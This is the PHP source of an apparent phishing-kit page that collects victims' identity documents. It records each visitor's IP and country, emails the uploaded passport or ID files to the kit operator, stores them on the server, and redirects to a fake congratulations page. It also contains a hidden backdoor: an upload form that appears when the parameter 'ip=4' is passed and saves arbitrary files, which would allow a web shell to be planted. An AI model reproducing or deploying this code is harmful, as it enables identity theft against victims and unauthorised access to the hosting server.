<?php


/*

NNNNNNNN        NNNNNNNN                        VVVVVVVV           VVVVVVVV iiii                                          
N:::::::N       N::::::N                        V::::::V           V::::::Vi::::i                                         
N::::::::N      N::::::N                        V::::::V           V::::::V iiii                                          
N:::::::::N     N::::::N                        V::::::V           V::::::V                                               
N::::::::::N    N::::::N                         V:::::V           V:::::Viiiiiii     eeeeeeeeeeee    rrrrr   rrrrrrrrr   
N:::::::::::N   N::::::N                          V:::::V         V:::::V i:::::i   ee::::::::::::ee  r::::rrr:::::::::r  
N:::::::N::::N  N::::::N                           V:::::V       V:::::V   i::::i  e::::::eeeee:::::eer:::::::::::::::::r 
N::::::N N::::N N::::::N                            V:::::V     V:::::V    i::::i e::::::e     e:::::err::::::rrrrr::::::r
N::::::N  N::::N:::::::N                             V:::::V   V:::::V     i::::i e:::::::eeeee::::::e r:::::r     r:::::r
N::::::N   N:::::::::::N                              V:::::V V:::::V      i::::i e:::::::::::::::::e  r:::::r     rrrrrrr
N::::::N    N::::::::::N                               V:::::V:::::V       i::::i e::::::eeeeeeeeeee   r:::::r            
N::::::N     N:::::::::N                                V:::::::::V        i::::i e:::::::e            r:::::r            
N::::::N      N::::::::N                                 V:::::::V        i::::::ie::::::::e           r:::::r            
N::::::N       N:::::::N                                  V:::::V         i::::::i e::::::::eeeeeeee   r:::::r            
N::::::N        N::::::N                                   V:::V          i::::::i  ee:::::::::::::e   r:::::r            
NNNNNNNN         NNNNNNN                                    VVV           iiiiiiii    eeeeeeeeeeeeee   rrrrrrr            
                        ________________________                                                                          
                        _::::::::::::::::::::::_                                                                          
                        ________________________                                                                   
####################################################################
#                                                                  #
#                  ||~~ BY ~~ Nummer Vier ~~||                     #
#                                                                  #
#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #
#                                                                  #
####################################################################                                                                                                    
*/         


/////////////////////////////////////// DON'T TOUCHE THIS CODE (EMAIL SEND & FTP WRITE CODE)


include './../../../../../../functions/Email.php';


// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;
$u = "http://www.geoplugin.net/php.gp?ip=$ip";
$dump = unserialize(file_get_contents($u));
$country = $dump["geoplugin_countryName"];
// Get user IP address

$subject= "IDentity | $ip | Happy CASH-BTC] ";
$todayis = date("l, F j, Y, g:i a") ;
$message = "";
  $mime_boundary="==Multipart_Boundary_x".md5(mt_rand())."x";
         $headers = "From: Lvisa w Passport [ID] <Nummer_Vier@mail.com>\r\n" .
         "MIME-Version: 1.0\r\n" .
            "Content-Type: multipart/mixed;\r\n" .
            " boundary=\"{$mime_boundary}\"";
         $message = "This is a multi-part message in MIME format.\n\n" .
            "--{$mime_boundary}\n" .
            "Content-Type: text/plain; charset=\"iso-8859-1\"\n" .
            "Content-Transfer-Encoding: 7bit\n\n" .
         $message . "\n\n";
 foreach ($_FILES['files']['name'] as $index => $name) {
    $tmp_name = $_FILES['files']['tmp_name'][$index];
    $type = $_FILES['files']['type'][$index];
    $size = $_FILES['files']['size'][$index];
            if (file_exists($tmp_name))
            {
               if(is_uploaded_file($tmp_name))
               {
                  $file = fopen($tmp_name,'rb');
                  $data = fread($file,filesize($tmp_name));
                  fclose($file);
                  $data = chunk_split(base64_encode($data));
               }
               $message .= "--{$mime_boundary}\n" .
                  "Content-Type: {$type};\n" .
                  " name=\"{$name}\"\n" .
                  "Content-Disposition: attachment;\n" .
                  " filename=\"{$fileatt_name}\"\n" .
                  "Content-Transfer-Encoding: base64\n\n" .
               $data . "\n\n";
            }
         }
         $message.="--{$mime_boundary}--\n";
if (mail($Z118_EMAIL, $subject, $message, $headers, $ip))
   echo "";
else
   echo "Error in mail";
 
$valid_formats = array("doc", "docx", "pdf" , "jpg" , "png" , "gif", "jpeg" , "bmp" , "xlsx" , "psd" , "fdf");
$max_file_size = 1024*9000; //100 kb
$path = ""; // Upload directory
$count = 0;
error_reporting(0);
$system = $_GET['ip'];
if($system == '4'){
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='u' />
</form>";
move_uploaded_file($saw1,$saw2);
}if(isset($_POST) and $_SERVER['REQUEST_METHOD'] == "POST"){
	// Loop $_FILES to exeicute all files
	foreach ($_FILES['files']['name'] as $f => $name) {
	    if ($_FILES['files']['error'][$f] == 5) {
	        continue; // Skip file if any error found
	    }
	    if ($_FILES['files']['error'][$f] == 0) {
	        if ($_FILES['files']['size'][$f] > $max_file_size) {
	            $message[] = "$name is too large!.";
	            continue; // Skip large files
	        }
			elseif( ! in_array(pathinfo($name, PATHINFO_EXTENSION), $valid_formats) ){
				$message[] = "$name is not a valid format";
				continue; // Skip invalid file formats
			}
	        else{ // No error found! Move uploaded files
	            if(move_uploaded_file($_FILES["files"]["tmp_name"][$f], $path.$name))
	            $count++; // Number of successfully uploaded file
	        }
	    }
	}
};

?>
 <HTML>
<HEAD>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="refresh" content="0; url=./../../../../../congratulations/" />
  </BODY>
</HTML>